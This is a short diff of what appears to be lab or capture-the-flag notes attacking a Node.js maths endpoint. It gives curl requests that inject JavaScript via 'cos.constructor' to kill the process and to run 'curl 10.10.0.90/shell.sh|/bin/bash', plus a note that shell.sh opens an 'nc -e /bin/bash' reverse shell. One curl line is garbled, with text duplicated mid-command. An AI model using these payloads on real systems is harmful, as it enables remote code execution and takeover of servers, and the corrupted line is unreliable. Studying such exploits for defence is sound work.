@@ -32,3 +32,4 @@ curl --data-urlencode 'equation=cos.constructor("return process.kill(process.pid
 curl -d 'equation=cos.constructor("return+process.macurl -d 'equation=cos.constructor("return+process.mainModule.constructor._load(\"child_process\").exec(\"curl+10.10.0.90/shell.sh|/bin/bash\")")()' "http://10.0.30.60/got_maths/maths"
 23. the file shell.sh is the command nc -e /bin/bash <IP> <PORT> and |/bin/bash of equation is the execute
 
+
